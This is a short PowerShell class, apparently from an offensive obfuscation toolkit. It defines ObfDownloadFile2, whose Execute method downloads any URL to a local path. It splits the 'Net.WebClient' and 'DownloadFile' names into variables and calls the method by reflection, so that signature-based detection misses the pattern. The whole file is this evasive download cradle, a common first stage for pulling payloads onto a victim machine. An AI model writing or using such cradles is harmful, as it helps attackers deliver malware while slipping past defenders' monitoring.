Class ObfDownloadFile2 {

    static Execute ([String]$url, [String]$path) {
        #CLI:  Disk\PsWebFile\Rearrange\2
        $wc2='Net.WebClient';$dpath=$path;$wc=(New-Object $wc2);$df='DownloadFile';$wc.$df.Invoke($url,$dpath)

    }

}